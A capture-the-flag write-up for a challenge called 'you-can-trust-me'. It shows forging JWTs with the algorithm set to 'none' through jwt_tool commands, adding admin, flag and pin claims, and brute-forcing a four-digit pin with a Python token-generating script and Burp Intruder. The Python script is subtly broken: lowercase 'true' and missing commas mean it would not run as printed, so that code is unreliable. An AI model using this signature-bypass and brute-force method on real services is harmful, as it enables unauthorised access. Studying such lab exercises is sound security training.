# you-can-trust-me

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/c967f94b-b723-48a1-a355-d2599293e575)

# Solution

Making a GET request on the provided target and intercepting with BurpSuite, we can see that the response gives us a JWT token:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/16c17d41-10ff-4c58-bc6e-fee47749d438)

Using that in our request, we can see a message:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/4a4cd9a0-52a4-47ad-8726-4a543709d6a5)

Decoding the token on [jwt.io](https://jwt.io/) we can see that it's a simple token with only one claim set to `user` with value being `anonymous`. The signing algorithm is set to `HS256`:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8a7bdb41-44c5-4bcf-9b90-9cfb996e4405)

We can use the [jwt_tool](https://github.com/ticarpi/jwt_tool) to try and tamper with it. A common misconfiguration is not verifying the token properly which could mean that we can remove the signature and set the algorithm to `None`:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0161d7cc-364c-448f-b292-d0ce68a1c147)

For example, we can use the syntax below to modify the `user` payload claim to another value, like admin:  

```bash
python3 jwt_tool.py -X a -I -pc user -pv admin eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIn0.Xl5HeSFhyngGKrT3GfzS3MzUWiNJyYvTY74nVItbIG0
```
This doesn't seem to change the message we get, however we don't get an error complaining about the signature either. So we need to keep looking. Fuzzing the URL, we get a hit on `/docs`:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/46a97b88-faec-4be4-8999-c1fa7ed6ebcb)

In the swagger documentation, we get a helpful hint which makes us believe that we are missing something from our forged token:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2179a681-ca55-40de-bd13-07accb8ae3ac)

We adjust our syntax to include this payload claim as well:  
```bash
python3 jwt_tool.py -X a -I -pc user -pv admin -pc is_admin -pv true eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIn0.Xl5HeSFhyngGKrT3GfzS3MzUWiNJyYvTY74nVItbIG0
```
Now we get a different error message but a helpful one:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/094a0a02-f070-415b-89a6-aacc534c667c)

Let's add the missing flag claim as well:  

```bash
python3 jwt_tool.py -X a -I -pc user -pv admin -pc is_admin -pv true -pc flag -pv true eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIn0.Xl5HeSFhyngGKrT3GfzS3MzUWiNJyYvTY74nVItbIG0
```
We seem to be on the right track. We now get a different error complaining about a missing pin:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/4427fbd4-645c-4253-aa8b-acfc46d0520c)

We again adjust our token:  

```bash
python3 jwt_tool.py -X a -I -pc user -pv admin -pc is_admin -pv true -pc flag -pv true -pc pin -pv 1234 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIn0.Xl5HeSFhyngGKrT3GfzS3MzUWiNJyYvTY74nVItbIG0
```
We are getting closer. We get a different error about the pin not being correct which would make sense:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/58e2dffc-0d9c-4216-bdd9-567348df55e9)

So far, our token looks something like this:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a64d6ee7-aabc-42d7-8a07-9362538cc300)

At this point, it was pretty obvious that we need to bruteforce the pin so I wrote this python script to generate a wordlist of jwt tokens containing all the 4 digit pins:  

```python3
import jwt

with open('wordlist.txt', 'a') as fp: 
    for i in range(9999):
        claims = {
            "user": "admin",
            "is_admin": true
            "flag": true
            "pin": i
        }

        token = jwt.encode(claims, key=None, algorithm="none")
        fp.write(token + '\n')
```
I gave the wordlist to BurpSuite Intruder, it can also be done with ffuf or other fuzzing tools, and shortly, on pin 7331 (1337 reversed) we get our flag:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/01e059c7-335f-4cbe-a16a-48abb86f1a83)

`CTF{2965f7e9fcc77fff2bd869db984df8371845d6781edb382cc34536904207a53d}`
